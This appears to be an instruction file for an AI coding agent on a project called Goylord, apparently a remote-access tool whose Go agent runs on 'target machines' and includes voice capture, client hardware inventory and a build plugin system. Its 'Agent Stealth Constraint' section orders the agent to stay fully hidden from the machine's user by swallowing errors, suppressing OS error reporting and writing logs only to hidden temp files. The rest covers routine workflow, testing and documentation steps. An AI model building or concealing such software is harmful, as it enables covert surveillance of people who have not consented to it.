- **S1** (agent auth bypass via missing AGENT_TOKEN) — see above
- **S2** from the audit

### Agent Stealth Constraint (CRITICAL)

The Go agent (Goylord-Client) MUST be completely silent on the target machine. The target machine operator/client must never see any indication that the agent exists or is malfunctioning.

- **NEVER** show Windows error popups, dialog boxes, message boxes, or any GUI notifications
- **NEVER** write visible error messages to stdout/stderr that could be seen in a console
- **NEVER** let crash logs or error output reach the user-visible desktop
- **ALWAYS** swallow errors silently in the agent — error swallowing is correct behavior for the agent
- **ALWAYS** use `defer func() { recover() }()` generously to catch panics without crashing visibly
- **ALWAYS** suppress OS-level error reporting (e.g., `SetErrorMode(SEM_FAILCRITICALERRORS)` on Windows)
- Crash logs go to hidden temp files only — never surface to the user

This is a hard constraint. The client/target machine must NOT know anything about the agent's operation.

### Do Not Touch Without Asking

- `vendor/` directory is gitignored and auto-generated. Never edit files there directly.
- Pre-existing test failures in `client-order.test.ts` (5 tests) — these are known and not in scope.

### SPA Soft-Navigation System (Turbo Drive)

- `turbo-navigation.js` wraps Hotwire Turbo Drive for SPA navigation — intercepts link clicks, replaces body without full page reload
- `persistentIds` preserved across navigations: `top-nav`, `sb-mobile-bar`, `sb-backdrop`, `nav-reveal-btn`, `chat-bubble`, `chat-panel`, `cert-trust-banner`, `command-menu` (8 items)
- Module scripts re-execute as new instances (different `?turboVisit=N` URL)
- `nav.js` and `nav-prelude.js` are SKIPPED on soft-nav (`data-turbo-eval="false"`)
- `cleanupPageResources()` dispatches `pagehide` BEFORE removing listeners
- `visitSequence` counter detects stale navigations at every await point
- `turboVisit()` wraps Turbo's `visit()` for client-side navigation

Pages served at clean URLs: `/console`, `/settings`, `/purgatory`, etc. Only `/login.html`, `/register.html`, `/change-password.html`, `/index.html` use `.html` extension.

## Architecture Notes

### Scalability

- SQLite single-writer, all client state in-memory `Map<string, ClientInfo>`
- ~100+ in-memory maps in `main-server.ts`
- WebSocket relay is O(viewers) per frame
- Bottleneck at ~1K-5K clients depending on feature usage

### RAM Format

Stored as text like `"16 GB"` in DB. SQL filter: `CAST(REPLACE(REPLACE(LOWER(...), ' gb', ''), ' mb', '') AS REAL)`

### Hardware Filter

CPU/GPU are `<select>` dropdowns populated from `GET /api/clients/hardware-options` (returns distinct values). RAM stays min/max number inputs.

### Backup/Restore

- Export: `GET /api/backup/export` — returns ZIP
- Import: `POST /api/backup/import` — accepts ZIP body
- Pure JS CRC32 + ZIP implementation in `backup-routes.ts`

### Voice Capture

Uses `winmm.dll` `waveIn*`/`waveOut*` APIs — pure Go, no COM.

### Build Plugin System

- Plugins placed as zips in `Goylord-Server/plugins/` auto-extracted on startup
- Plugin `config.json` → extracted → `manifest.json` via `normalizePluginBuildIntegration()`
- Setting types: `["string", "number", "boolean", "select", "textarea"]` (NOT `"text"`)
- `GET /api/build/plugins` filters: `manifest.build && manifest.hasServer === true`
- Build page renders cards with settings forms in "Build Plugins" accordion section
- Artifact hook: `runBuildHookForAll("artifact", ...)` → each Worker's `onBuildArtifact(ctx, payload)`
- Plugin returns `{ file: { filename } }` → server swaps `finalOutputName` before download/upload/push
- Last plugin wins when multiple plugins are enabled simultaneously
- Developer guide: `docs/BUILD_PLUGIN_DEVELOPMENT.md` and `plugins/BUILD-PLUGINS.md`

1. **Read before editing** — understand existing code patterns and conventions
2. **Edit files** — make changes following existing patterns
3. **Run tests** — `cd Goylord-Server; bun test` (expect 637 pass, 5 fail)
4. **Update Changes.md** — add timestamped entry at end of file with:
   - What was changed and why
   - Root cause (if bug fix)
   - What files were modified
   - Test results
5. **Update CHANGELOG.md** — add structured entry per GITHUB.md format (severity table, component, sub-fixes)
6. **Update docs/** — before ANY commit, ensure the `docs/` directory reflects the latest state:
   - If you changed server code → update `docs/GOYLORD_SERVER.md`
   - If you changed client code → update `docs/GOYLORD_CLIENT.md`
   - If you changed desktop code → update `docs/GOYLORD_DESKTOP.md`

   - If you added a new feature → create or update the relevant doc in `docs/`
   - If you changed build system → update `docs/BUILD_DEPLOYMENT.md`
